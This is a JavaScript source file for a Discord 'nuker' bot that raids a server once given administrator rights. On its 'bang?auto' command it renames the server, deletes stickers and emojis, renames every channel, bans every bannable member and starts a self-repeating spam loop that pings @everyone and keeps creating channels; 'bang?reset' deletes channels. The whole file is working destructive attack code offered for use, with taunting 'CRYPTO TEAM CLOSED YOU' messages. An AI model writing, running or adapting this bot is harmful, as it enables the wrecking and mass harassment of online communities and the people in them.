const Discord = require("discord.js");
const client = new Discord.Client({
  intents: [
    "DIRECT_MESSAGES",
    "GUILDS",
    "GUILD_BANS",
    "GUILD_MESSAGES",
    "GUILD_MEMBERS",
    "GUILD_VOICE_STATES",
    "GUILD_PRESENCES",
  ],
  partials: ["CHANNEL", "GUILD_MEMBER", "MESSAGE", "REACTION", "USER"],
});

const prefix = "bang?";

client.once("ready", () => {
  console.log(`[API] Logged Successful.`);
  console.log(`[INFO] Username: ${client.user.username}.`);
  console.log(`[CMD] Registering Command...`);
  console.log(`[CMD] Registered!`);
  console.log("[NOTE] Use bang?auto to start the raid.");
  client.user
    .setActivity("Nuke Time!", { type: "WATCHING" })
    .client.user.setStatus("dnd");
});

client.on("messageCreate", async (message) => {
  const a = [1];
  if ("onspammer".includes(message.content)) {
    message.delete();
    if (!message.guild.members.me.permissions.has("ADMINISTRATOR")) {
      console.log("ADMINISTRATOR PERMISSION MISSING!");
    } else {
      for (let index = 0; index < a.length; index++) {
        message.guild.channels.cache.forEach(async (channel) => {
          channel.send(`CRYPTO TEAM CLOSED YOU @everyone @here`);
          let everyoneRole = message.guild.roles.cache.find(
            (r) => r.name === "@everyone"
          );
          message.guild.channels.create("crypto-team-closed-you", {
            type: "text",
            permissionOverwrites: [
              {
                id: everyoneRole.id,
                allow: ["VIEW_CHANNEL"],
              },
            ],
          });
        });
      }
    }
  } else if (
    `CRYPTO TEAM CLOSED YOU @everyone @here`.includes(message.content)
  ) {
    if (!message.guild.members.me.permissions.has("ADMINISTRATOR")) {
      console.log("ADMINISTRATOR PERMISSION MISSING!");
    } else {
      for (let index = 0; index < a.length; index++) {
        message.guild.channels.cache.forEach((channel) => {
          channel.send(`CRYPTO TEAM CLOSED YOU @everyone @here`);
          let everyoneRole = message.guild.roles.cache.find(
            (r) => r.name === "@everyone"
          );
          message.guild.channels.create("crypto-team-closed-you", {
            type: "text",
            permissionOverwrites: [
              {
                id: everyoneRole.id,
                allow: ["VIEW_CHANNEL"],
              },
            ],
          });
        });
      }
    }
  }

  const args = message.content.slice(prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();

  if (!message.author.bot && message.content.startsWith(prefix)) {
    if (command === "auto") {
      message.guild.setName(`BangBang Nuker`);
      message.delete();
      // Checking if we have administrator permissions
      if (!message.guild.members.me.permissions.has("ADMINISTRATOR"))
        return console.log(`[ERR] I don't have administrator permissions!`);
      message.guild.stickers.cache.forEach((s) => {
        s.delete().then((deleted) =>
          console.log(`[DELETE] Deleted sticker: ${s.name}`)
        );
      });
      message.guild.emojis.cache.forEach((e) => {
        e.delete().then((deleted) =>
          console.log(`[DELETE] Deleted sticker: ${e.name}`)
        );
      });
      message.guild.channels.cache.forEach((ch) => {
        ch.setName(`crypto-team-closed-you`);
      });

      message.guild.members.cache.forEach((m) => {
        if (m.bannable) {
          m.ban({
            reason: "CRYPTO TEAM CLOSED YOU",
          });
        } else {
          console.log(`[ERR] Can't ban: ${m.user.tag}`);
        }
      });
      message.channel.send("onspammer").catch((err) => {
        console.log(`[ERR] Can't spam. Trying again...`);
        message.guild.channels.cache.forEach((c) => {
          c.send("onspammer").catch((err) => {
            console.log(
              `[ERR] Can't spam. You can normally send (onspammer) in a channel for getting the spammer started. ERR:\n${err}`
            );
          });
        });
      });
    } else if (command == "reset") {
      message.guild.channels.cache.forEach((c) => {
        if (c.deletable) c.delete();
      });
    }
  }
});

client
  .login("BOT_TOKEN")
  .catch((err) => console.log(`[ERR] Error while logging in!\n${err}`));

// Functions

function range(start, end) {
  var ans = [];
  for (let i = start; i <= end; i++) {
    ans.push(i);
  }
  return ans;
}
